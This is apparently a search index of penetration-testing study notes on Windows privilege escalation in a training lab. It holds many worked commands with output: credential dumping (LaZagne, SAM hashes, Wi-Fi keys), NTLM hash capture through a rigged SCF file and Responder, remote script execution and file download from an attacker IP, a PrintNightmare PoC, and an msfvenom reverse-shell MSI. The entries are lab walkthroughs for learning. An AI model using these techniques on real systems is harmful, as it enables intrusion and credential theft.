*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154:panther1 Session..........: hashcat Status...........: Cracked Hash.Name........: KeePass 1 (AES/Twofish) and KeePass 2 (AES) Hash.Target......: $keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d...39c154 Time.Started.....: Fri Aug 6 11:17:47 2021 (22 secs) Time.Estimated...: Fri Aug 6 11:18:09 2021 (0 secs) Guess.Base.......: File (/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 276 H/s (4.79ms) @ Accel:1024 Loops:16 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 6144/14344385 (0.04%) Rejected.........: 0/6144 (0.00%) Restore.Point....: 0/14344385 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:59984-60000 Candidates.#1....: 123456 -> iheartyou Started: Fri Aug 6 11:17:45 2021 Stopped: Fri Aug 6 11:18:11 2021","title":"Password Managers"},{"location":"windows_privesc/further_credential_theft/#email","text":"If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as \"pass,\" \"creds,\" \"credentials,\" etc. using MailSniper .","title":"Email"},{"location":"windows_privesc/further_credential_theft/#others","text":"When all else fails, we can run the LaZagne tool in an attempt to retrieve credentials from a wide variety of software. PS C :\\ htb > .\\ lazagne . exe all |====================================================================| | | | The LaZagne Project | | | | ! BANG BANG ! | | | |====================================================================| ########## User: jordan ########## ------------------- Winscp passwords ----------------- [+] Password found !!! URL : transfer . inlanefreight . local Login : root Password : Summer2020 ! Port : 22 ------------------- Credman passwords ----------------- [+] Password found !!! URL : dev01 . dev . inlanefreight . local Login : jordan_adm Password : ! Q A Z z a q 1 [+] 2 passwords have been found . For more information launch it again with the -v option elapsed time = 5 . 50499987602 SessionGopher to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. We need local admin access to retrieve stored session information for every user in HKEY_USERS , but it is always worth running as our current user to see if we can find any useful credentials. PS C :\\ htb > .\\ SessionGopher . ps1 PS C :\\ Tools > Invoke-SessionGopher -Target WINLPE-SRV01 o_ / \". SessionGopher ,\" _ - \" ,\" m m ..+ ) Brandon Arvanaghi ` m .. m Twitter : @arvanaghi | arvanaghi . com [+] Digging on WINLPE-SRV01 ... WinSCP Sessions Source : WINLPE-SRV01 \\ htb-student Session : Default% 20Settings Hostname : Username : Password : PuTTY Sessions Source : WINLPE-SRV01 \\ htb-student Session : nix03 Hostname : nix03 . inlanefreight . local SuperPuTTY Sessions Source : WINLPE-SRV01 \\ htb-student SessionId : NIX03 SessionName : NIX03 Host : nix03 . inlanefreight . local Username : srvadmin ExtraArgs : Port : 22 Putty Session : Default Settings","title":"Others"},{"location":"windows_privesc/further_credential_theft/#wifi-passwords","text":"If we obtain local admin access to a user's workstation with a wireless card, we can list out any wireless networks they have recently connected to. C:\\htb> netsh wlan show profile Profiles on interface Wi-Fi: Group policy profiles (read only) --------------------------------- <None> User profiles ------------- All User Profile : Smith Cabin All User Profile : Bob's iPhone All User Profile : EE_Guest All User Profile : EE_Guest 2.4 All User Profile : ilfreight_corp Depending on the network configuration, we can retrieve the pre-shared key ( Key Content below) and potentially access the target network. While rare, we may encounter this during an engagement and use this access to jump onto a separate wireless network and gain access to additional resources. C:\\htb> netsh wlan show profile ilfreight_corp key=clear Profile ilfreight_corp on interface Wi-Fi: ======================================================================= Applied: All User Profile Profile information ------------------- Version : 1 Type : Wireless LAN Name : ilfreight_corp Control options : Connection mode : Connect automatically Network broadcast : Connect only if this network is broadcasting AutoSwitch : Do not switch to other networks MAC Randomization : Disabled Connectivity settings --------------------- Number of SSIDs : 1 SSID name : \"ilfreight_corp\" Network type : Infrastructure Radio type : [ Any Radio Type ] Vendor extension : Not present Security settings ----------------- Authentication : WPA2-Personal Cipher : CCMP Authentication : WPA2-Personal Cipher : GCMP Security key : Present Key Content : ILFREIGHTWIFI-CORP123908! Cost settings ------------- Cost : Unrestricted Congested : No Approaching Data Limit : No Over Data Limit : No Roaming : No Cost Source : Default","title":"Wifi Passwords"},{"location":"windows_privesc/gtlotl/","text":"Network Information \u00b6 Interface(s), IP Address(es), DNS Information C:\\htb> ipconfig /all ARP Table C:\\htb> arp -a Routing Table C:\\htb> route print Enumerating Protections \u00b6 Check Windows Defender Status PS C:\\htb> Get-MpComputerStatus List AppLocker Rules PS C:\\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections Test AppLocker Policy PS C:\\htb> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path","title":"Situational Awareness"},{"location":"windows_privesc/gtlotl/#network-information","text":"Interface(s), IP Address(es), DNS Information C:\\htb> ipconfig /all ARP Table C:\\htb> arp -a Routing Table C:\\htb> route print","title":"Network Information"},{"location":"windows_privesc/gtlotl/#enumerating-protections","text":"Check Windows Defender Status PS C:\\htb> Get-MpComputerStatus List AppLocker Rules PS C:\\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections Test AppLocker Policy PS C:\\htb> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path","title":"Enumerating Protections"},{"location":"windows_privesc/hyperv_admins/","text":"The Hyper-V Administrators group has full access to all Hyper-V features . If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain. It is also well documented on this blog , that upon deleting a virtual machine, vmms.exe attempts to restore the original file permissions on the corresponding .vhdx file and does so as NT AUTHORITY\\SYSTEM , without impersonating the user. We can delete the .vhdx file and create a native hard link to point this file to a protected SYSTEM file, which we will have full permissions to. If the operating system is vulnerable to CVE-2018-0952 or CVE-2019-0841 , we can leverage this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users. An example of this is Firefox, which installs the Mozilla Maintenance Service . We can update this exploit (a proof-of-concept for NT hard link) to grant our current user full permissions on the file below: C:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe After running the PowerShell script, we should have full control of this file and can take ownership of it. C:\\htb> takeown /F C:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe Next, we can replace this file with a malicious maintenanceservice.exe, start the maintenance service, and get command execution as SYSTEM. C:\\htb> sc.exe start MozillaMaintenance Note: This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.","title":"Hyper-V Administrators"},{"location":"windows_privesc/init_enum/","text":"System Information \u00b6 Looking at the system itself will give us a better idea of the exact operating system version, hardware in use, installed programs, and security updates. This will help us narrow down our hunt for any missing patches and associated CVEs that we may be able to leverage to escalate privileges. Using the tasklist command to look at running processes will give us a better idea of what applications are currently running on the system. Tasklist C:\\htb> tasklist /svc Standard Windows processes such as Session Manager Subsystem (smss.exe) , Client Server Runtime Subsystem (csrss.exe) , WinLogon (winlogon.exe) , Local Security Authority Subsystem Service (LSASS) , and Service Host (svchost.exe) Other processes such as MsMpEng.exe , Windows Defender, are interesting because they can help us map out what protections are in place on the target host that we may have to evade/bypass. Display All Environment Variables \u00b6 C:\\htb> set View Detailed Configuration Information \u00b6 The systeminfo command will show if the box has been patched recently and if it is a VM. Google the KBs installed under HotFixes to get an idea of when the box has been patched. C:\\htb> systeminfo Patches and Updates \u00b6 If systeminfo doesn't display hotfixes, they may be queriable with WMI using the WMI-Command binary with QFE (Quick Fix Engineering) to display patches. C:\\htb> wmic qfe Can do this as well with PS PS C:\\htb> Get-HotFix | ft -AutoSize Installed Programs \u00b6 WMI can also be used to display installed software. This information can often guide us towards hard-to-find exploits. Run LaZagne to check if stored credentials for those applications are installed. Also, some programs may be installed and running as a service that is vulnerable. C:\\htb> wmic product get name Can do this as well with PS PS C:\\htb> Get-WmiObject -Class Win32_Product | select Name, Version Display Running Processes \u00b6 Display active TCP and UDP connections PS C:\\htb> netstat -ano User and Group Information \u00b6 Logged-In Users \u00b6 C:\\htb> query user Curent User \u00b6 Suppose we gain access as a service account. In that case, we may have privileges such as SeImpersonatePrivilege , which can often be easily abused to escalate privileges using a tool such as Juicy Potato . C:\\htb> echo %USERNAME% Curent User Privileges \u00b6 C:\\htb> whoami /priv Current User Group Information \u00b6 C:\\htb> whoami /groups Get All Users \u00b6 If we gained RDP access to a host using credentials we captured for a user bob, and see a bob_adm user in the local administrators group, it is worth checking for credential re-use. C:\\htb> net user Get All Groups \u00b6 Knowing what non-standard groups are present on the host can help us determine what the host is used for, how heavily accessed it is, or may even lead to discovering a misconfiguration such as all Domain Users in the Remote Desktop or local administrators groups. C:\\htb> net localgroup Details About a Group \u00b6 C:\\htb> net localgroup administrators Get Password Policy & Other Account Information \u00b6 C:\\htb> net accounts","title":"Initial Enumeration"},{"location":"windows_privesc/init_enum/#system-information","text":"Looking at the system itself will give us a better idea of the exact operating system version, hardware in use, installed programs, and security updates. This will help us narrow down our hunt for any missing patches and associated CVEs that we may be able to leverage to escalate privileges. Using the tasklist command to look at running processes will give us a better idea of what applications are currently running on the system. Tasklist C:\\htb> tasklist /svc Standard Windows processes such as Session Manager Subsystem (smss.exe) , Client Server Runtime Subsystem (csrss.exe) , WinLogon (winlogon.exe) , Local Security Authority Subsystem Service (LSASS) , and Service Host (svchost.exe) Other processes such as MsMpEng.exe , Windows Defender, are interesting because they can help us map out what protections are in place on the target host that we may have to evade/bypass.","title":"System Information"},{"location":"windows_privesc/init_enum/#display-all-environment-variables","text":"C:\\htb> set","title":"Display All Environment Variables"},{"location":"windows_privesc/init_enum/#view-detailed-configuration-information","text":"The systeminfo command will show if the box has been patched recently and if it is a VM. Google the KBs installed under HotFixes to get an idea of when the box has been patched. C:\\htb> systeminfo","title":"View Detailed Configuration Information"},{"location":"windows_privesc/init_enum/#patches-and-updates","text":"If systeminfo doesn't display hotfixes, they may be queriable with WMI using the WMI-Command binary with QFE (Quick Fix Engineering) to display patches. C:\\htb> wmic qfe Can do this as well with PS PS C:\\htb> Get-HotFix | ft -AutoSize","title":"Patches and Updates"},{"location":"windows_privesc/init_enum/#installed-programs","text":"WMI can also be used to display installed software. This information can often guide us towards hard-to-find exploits. Run LaZagne to check if stored credentials for those applications are installed. Also, some programs may be installed and running as a service that is vulnerable. C:\\htb> wmic product get name Can do this as well with PS PS C:\\htb> Get-WmiObject -Class Win32_Product | select Name, Version","title":"Installed Programs"},{"location":"windows_privesc/init_enum/#display-running-processes","text":"Display active TCP and UDP connections PS C:\\htb> netstat -ano","title":"Display Running Processes"},{"location":"windows_privesc/init_enum/#user-and-group-information","text":"","title":"User and Group Information"},{"location":"windows_privesc/init_enum/#logged-in-users","text":"C:\\htb> query user","title":"Logged-In Users"},{"location":"windows_privesc/init_enum/#curent-user","text":"Suppose we gain access as a service account. In that case, we may have privileges such as SeImpersonatePrivilege , which can often be easily abused to escalate privileges using a tool such as Juicy Potato . C:\\htb> echo %USERNAME%","title":"Curent User"},{"location":"windows_privesc/init_enum/#curent-user-privileges","text":"C:\\htb> whoami /priv","title":"Curent User Privileges"},{"location":"windows_privesc/init_enum/#current-user-group-information","text":"C:\\htb> whoami /groups","title":"Current User Group Information"},{"location":"windows_privesc/init_enum/#get-all-users","text":"If we gained RDP access to a host using credentials we captured for a user bob, and see a bob_adm user in the local administrators group, it is worth checking for credential re-use. C:\\htb> net user","title":"Get All Users"},{"location":"windows_privesc/init_enum/#get-all-groups","text":"Knowing what non-standard groups are present on the host can help us determine what the host is used for, how heavily accessed it is, or may even lead to discovering a misconfiguration such as all Domain Users in the Remote Desktop or local administrators groups. C:\\htb> net localgroup","title":"Get All Groups"},{"location":"windows_privesc/init_enum/#details-about-a-group","text":"C:\\htb> net localgroup administrators","title":"Details About a Group"},{"location":"windows_privesc/init_enum/#get-password-policy-other-account-information","text":"C:\\htb> net accounts","title":"Get Password Policy &amp; Other Account Information"},{"location":"windows_privesc/interacting_with_users/","text":"Monitoring for Process Command Lines \u00b6 When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line. while ( $true ) { $process = Get-WmiObject Win32_Process | Select-Object CommandLine Start-Sleep 1 $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine Compare-Object -ReferenceObject $process -DifferenceObject $process2 } We can host the script on our attack machine and execute it on the target host as follows. PS C :\\ htb > IEX ( iwr 'http//10.10.10.205/procmon.ps1' ) InputObject SideIndicator ----------- ------------- @{ CommandLine = C :\\ Windows \\ system32 \\ DllHost . exe / Processid :{ AB8902B4 - 09CA - 4BB6-B78D-A8F59079A8D5 }} => @{ CommandLine = \u201c C :\\ Windows \\ system32 \\ cmd . exe \u201d } => @{ CommandLine =\\??\\ C :\\ Windows \\ system32 \\ conhost . exe 0x4 } => @{ CommandLine = net use T : \\\\ sql02 \\ backups / user : inlanefreight \\ sqlsvc My4dm1nP @s5w0Rd } => @{ CommandLine = \u201c C :\\ Windows \\ system32 \\ backgroundTaskHost . exe \u201d -ServerName : CortanaUI . AppXy7vb4pc2 ... <= SCF on a File Share \u00b6 A Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as Responder , Inveigh , or InveighZero , we can often capture NTLMv2 password hashes for any users who browse the share. Create file, name it similar to another file, so it does not appear out of place. Put tun0 IP and any fake share name and .ico file name. [Shell] Command=2 IconFile=\\\\10.10.14.3\\share\\legit.ico [Taskbar] Command=ToggleDesktop Next, start Responder on our attack box and wait for the user to browse the share. If all goes to plan, we will see the user's NTLMV2 password hash in our console and attempt to crack it offline. hrmns@htb[/htb]$ sudo responder -wrf -v -I tun0 __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR & MDNS Responder 3.0.2.0 Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C [+] Poisoners: LLMNR [ON] NBT-NS [ON] DNS/MDNS [ON] [+] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [ON] Auth proxy [OFF] SMB server [ON] Kerberos server [ON] SQL server [ON] FTP server [ON] IMAP server [ON] POP3 server [ON] SMTP server [ON] DNS server [ON] LDAP server [ON] RDP server [ON] [+] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF] [+] Poisoning Options: Analyze Mode [OFF] Force WPAD auth [OFF] Force Basic Auth [OFF] Force LM downgrade [OFF] Fingerprint hosts [ON] [+] Generic Options: Responder NIC [tun2] Responder IP [10.10.14.3] Challenge set [random] Don't Respond To Names ['ISATAP'] [!] Error starting SSL server on port 443, check permissions or other servers running. [+] Listening for events... [SMB] NTLMv2-SSP Client : 10.129.43.30 [SMB] NTLMv2-SSP Username : WINLPE-SRV01\\Administrator [SMB] NTLMv2-SSP Hash : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>... We could then attempt to crack this password hash offline using Hashcat to retrieve the cleartext. hrmns@htb[/htb]$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... <SNIP> Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...:Welcome1 Session..........: hashcat Status...........: Cracked Hash.Name........: NetNTLMv2 Hash.Target......: ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:afb6d3...000000 Time.Started.....: Thu May 27 19:16:18 2021 (1 sec) Time.Estimated...: Thu May 27 19:16:19 2021 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 1233.7 kH/s (2.74ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 43008/14344385 (0.30%) Rejected.........: 0/43008 (0.00%) Restore.Point....: 36864/14344385 (0.26%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: holabebe -> harder Started: Thu May 27 19:16:16 2021 Stopped: Thu May 27 19:16:20 2021","title":"Interacting with Users"},{"location":"windows_privesc/interacting_with_users/#monitoring-for-process-command-lines","text":"When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line. while ( $true ) { $process = Get-WmiObject Win32_Process | Select-Object CommandLine Start-Sleep 1 $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine Compare-Object -ReferenceObject $process -DifferenceObject $process2 } We can host the script on our attack machine and execute it on the target host as follows. PS C :\\ htb > IEX ( iwr 'http//10.10.10.205/procmon.ps1' ) InputObject SideIndicator ----------- ------------- @{ CommandLine = C :\\ Windows \\ system32 \\ DllHost . exe / Processid :{ AB8902B4 - 09CA - 4BB6-B78D-A8F59079A8D5 }} => @{ CommandLine = \u201c C :\\ Windows \\ system32 \\ cmd . exe \u201d } => @{ CommandLine =\\??\\ C :\\ Windows \\ system32 \\ conhost . exe 0x4 } => @{ CommandLine = net use T : \\\\ sql02 \\ backups / user : inlanefreight \\ sqlsvc My4dm1nP @s5w0Rd } => @{ CommandLine = \u201c C :\\ Windows \\ system32 \\ backgroundTaskHost . exe \u201d -ServerName : CortanaUI . AppXy7vb4pc2 ... <=","title":"Monitoring for Process Command Lines"},{"location":"windows_privesc/interacting_with_users/#scf-on-a-file-share","text":"A Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as Responder , Inveigh , or InveighZero , we can often capture NTLMv2 password hashes for any users who browse the share. Create file, name it similar to another file, so it does not appear out of place. Put tun0 IP and any fake share name and .ico file name. [Shell] Command=2 IconFile=\\\\10.10.14.3\\share\\legit.ico [Taskbar] Command=ToggleDesktop Next, start Responder on our attack box and wait for the user to browse the share. If all goes to plan, we will see the user's NTLMV2 password hash in our console and attempt to crack it offline. hrmns@htb[/htb]$ sudo responder -wrf -v -I tun0 __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR & MDNS Responder 3.0.2.0 Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C [+] Poisoners: LLMNR [ON] NBT-NS [ON] DNS/MDNS [ON] [+] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [ON] Auth proxy [OFF] SMB server [ON] Kerberos server [ON] SQL server [ON] FTP server [ON] IMAP server [ON] POP3 server [ON] SMTP server [ON] DNS server [ON] LDAP server [ON] RDP server [ON] [+] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF] [+] Poisoning Options: Analyze Mode [OFF] Force WPAD auth [OFF] Force Basic Auth [OFF] Force LM downgrade [OFF] Fingerprint hosts [ON] [+] Generic Options: Responder NIC [tun2] Responder IP [10.10.14.3] Challenge set [random] Don't Respond To Names ['ISATAP'] [!] Error starting SSL server on port 443, check permissions or other servers running. [+] Listening for events... [SMB] NTLMv2-SSP Client : 10.129.43.30 [SMB] NTLMv2-SSP Username : WINLPE-SRV01\\Administrator [SMB] NTLMv2-SSP Hash : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>... We could then attempt to crack this password hash offline using Hashcat to retrieve the cleartext. hrmns@htb[/htb]$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... <SNIP> Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...:Welcome1 Session..........: hashcat Status...........: Cracked Hash.Name........: NetNTLMv2 Hash.Target......: ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:afb6d3...000000 Time.Started.....: Thu May 27 19:16:18 2021 (1 sec) Time.Estimated...: Thu May 27 19:16:19 2021 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 1233.7 kH/s (2.74ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 43008/14344385 (0.30%) Rejected.........: 0/43008 (0.00%) Restore.Point....: 36864/14344385 (0.26%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: holabebe -> harder Started: Thu May 27 19:16:16 2021 Stopped: Thu May 27 19:16:20 2021","title":"SCF on a File Share"},{"location":"windows_privesc/kernel_exploits/","text":"Checking Permissions on the SAM File We can check for this vulnerability using icacls to check permissions on the SAM file. In our case, we have a vulnerable version as the file is readable by the BUILTIN\\Users group. C:\\htb> icacls c:\\Windows\\System32\\config\\SAM C:\\Windows\\System32\\config\\SAM BUILTIN\\Administrators:(I)(F) NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Users:(I)(RX) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX) Successfully processed 1 files; Failed processing 0 files Performing Attack and Parsing Password Hashes This PoC can be used to perform the entire attack, including dumping the NTLM hashes from the SAM database, directly in the console. S C:\\htb> .\\CVE-2021-36934.exe [*] SAM: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\system32\\config\\sam [*] SYSTEM: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\system32\\config\\system [*] SECURITY: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\system32\\config\\security [*] Copying files to C:\\windows\\temp\\ [*] SAM hashes Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c93428723187f868ae2f99d4fa66dceb htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6 [*] Cached domain logon information(domain/username:hash) [*] LSA Secrets [*] DPAPI_SYSTEM dpapi_machinekey:3c7b7e66890fb2181a74bb56ab12195f248e9461 dpapi_userkey:c3e6491e75d7cffe8efd40df94d83cba51832a56 [*] NL$KM NL$KM:45c5b232298b05b8e7e7e04b2c148302ce2fe7d9b8e0f0f820c8e470ddd17f4f422ce69eaf5774010988b378173f8854528f8d9c0636c02443b9d80f3588b960 [*] Cleaning up.. Checking for Spooler Service We can quickly check if the Spooler service is running with the following command. If it is not running, we will receive a \"path does not exist\" error. PS C:\\htb> ls \\\\localhost\\pipe\\spoolss Directory: \\\\localhost\\pipe Mode LastWriteTime Length Name ---- ------------- ------ ---- spoolss Adding Local Admin with PrintNightmare PowerShell PoC PS C:\\htb> Import-Module .\\CVE-2021-1675.ps1 PS C:\\htb> Invoke-Nightmare -NewUser \"hacker\" -NewPassword \"Pwnd1234!\" -DriverName \"PrintIt\" [+] created payload at C:\\Users\\htb-student\\AppData\\Local\\Temp\\nightmare.dll [+] using pDriverPath = \"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_am d64_ce3301b66255a0fb\\Amd64\\mxdwdrv.dll\" [+] added user hacker as local administrator [+] deleting payload from C:\\Users\\htb-student\\AppData\\Local\\Temp\\nightmare.dll If all went to plan, we will have a new local admin user under our control. Adding a user is \"noisy,\" We would not want to do this on an engagement where stealth is a consideration. PS C:\\htb> net user hacker User name hacker Full Name hacker Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set ?8/?9/?2021 12:12:01 PM Password expires Never Password changeable ?8/?9/?2021 12:12:01 PM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon Never Logon hours allowed All Local Group Memberships *Administrators Global Group memberships *None The command completed successfully. Enumerating Missing Patches \u00b6 We can examine the installed updates in several ways. Below are three separate commands we can use. PS C:\\htb> systeminfo PS C:\\htb> wmic qfe list brief PS C:\\htb> Get-Hotfix Viewing Installed Updates with WMI C:\\htb> wmic qfe list brief Description FixComments HotFixID InstallDate InstalledBy InstalledOn Name ServicePackInEffect Status Update KB4601056 NT AUTHORITY\\SYSTEM 3/27/2021 Update KB4513661 1/9/2020 Security Update KB4516115 1/9/2020 Update KB4517245 1/9/2020 Security Update KB4528759 1/9/2020 Security Update KB4535680 NT AUTHORITY\\SYSTEM 3/27/2021 Security Update KB4580325 NT AUTHORITY\\SYSTEM 3/27/2021 Security Update KB5000908 NT AUTHORITY\\SYSTEM 3/27/2021 Security Update KB5000808 NT AUTHORITY\\SYSTEM 3/27/2021 Search for each KB (Microsoft Knowledge Base ID number) in the Microsoft Update Catalog to get a better idea of what fixes have been installed and how far behind the system may be on security updates.","title":"Kernel Exploits"},{"location":"windows_privesc/kernel_exploits/#enumerating-missing-patches","text":"We can examine the installed updates in several ways. Below are three separate commands we can use. PS C:\\htb> systeminfo PS C:\\htb> wmic qfe list brief PS C:\\htb> Get-Hotfix Viewing Installed Updates with WMI C:\\htb> wmic qfe list brief Description FixComments HotFixID InstallDate InstalledBy InstalledOn Name ServicePackInEffect Status Update KB4601056 NT AUTHORITY\\SYSTEM 3/27/2021 Update KB4513661 1/9/2020 Security Update KB4516115 1/9/2020 Update KB4517245 1/9/2020 Security Update KB4528759 1/9/2020 Security Update KB4535680 NT AUTHORITY\\SYSTEM 3/27/2021 Security Update KB4580325 NT AUTHORITY\\SYSTEM 3/27/2021 Security Update KB5000908 NT AUTHORITY\\SYSTEM 3/27/2021 Security Update KB5000808 NT AUTHORITY\\SYSTEM 3/27/2021 Search for each KB (Microsoft Knowledge Base ID number) in the Microsoft Update Catalog to get a better idea of what fixes have been installed and how far behind the system may be on security updates.","title":"Enumerating Missing Patches"},{"location":"windows_privesc/miscellaneous_techniques/","text":"Transferring File with Certutil \u00b6 certutil.exe intended use is for handling certificates but can also be used to transfer files by either downloading a file to disk or base64 encoding/decoding a file. PS C :\\ htb > certutil . exe -urlcache -split -f http :// 10 . 10 . 14 . 3 : 8080 / shell . bat shell . bat We can use the -encode flag to encode a file using base64 on our Windows attack host and copy the contents to a new file on the remote system. C:\\htb> certutil -encode file1 encodedfile Input Length = 7 Output Length = 70 CertUtil: -encode command completed successfully Once the new file has been created, we can use the -decode flag to decode the file back to its original contents. C:\\htb> certutil -decode encodedfile file2 Input Length = 70 Output Length = 7 CertUtil: -decode command completed successfully. Always Install Elevated \u00b6 This setting can be set via Local Group Policy by setting Always install with elevated privileges to Enabled under the following paths Computer Configuration\\Administrative Templates\\Windows Components\\Windows Installer User Configuration\\Administrative Templates\\Windows Components\\Windows Installer Enumerating Always Install Elevated Settings PS C :\\ htb > reg query HKEY_CURRENT_USER \\ Software \\ Policies \\ Microsoft \\ Windows \\ Installer HKEY_CURRENT_USER \\ Software \\ Policies \\ Microsoft \\ Windows \\ Installer AlwaysInstallElevated REG_DWORD 0x1 PS C :\\ htb > reg query HKLM \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer AlwaysInstallElevated REG_DWORD 0x1 AlwaysInstallElevated key exists, so the policy is indeed enabled on the target system. We can exploit this by generating a malicious MSI package and execute it via the command line to obtain a reverse shell with SYSTEM privileges. hrmns@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost = 10 .10.14.3 lport = 9443 -f msi > aie.msi [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 324 bytes Final size of msi file: 159744 bytes upload this MSI file to our target, start a Netcat listener and execute the file C:\\htb> msiexec /i c:\\users\\htb-student\\desktop\\aie.msi /quiet /qn /norestart we will receive a connection back as NT AUTHORITY\\SYSTEM hrmns@htb[/htb]$ nc -lnvp 9443 listening on [any] 9443 ... connect to [10.10.14.3] from (UNKNOWN) [10.129.43.33] 49720 Microsoft Windows [Version 10.0.18363.592] (c) 2019 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami whoami nt authority\\system This issue can be mitigated by disabling the two Local Group Policy settings mentioned above. Enumerating Scheduled Tasks \u00b6 We can use the schtasks command to enumerate scheduled tasks on the system. C:\\htb> schtasks /query /fo LIST /v Folder: \\ INFO: There are no scheduled tasks presently available at your access level. Folder: \\Microsoft INFO: There are no scheduled tasks presently available at your access level. Folder: \\Microsoft\\Windows INFO: There are no scheduled tasks presently available at your access level. Folder: \\Microsoft\\Windows\\.NET Framework HostName: WINLPE-SRV01 TaskName: 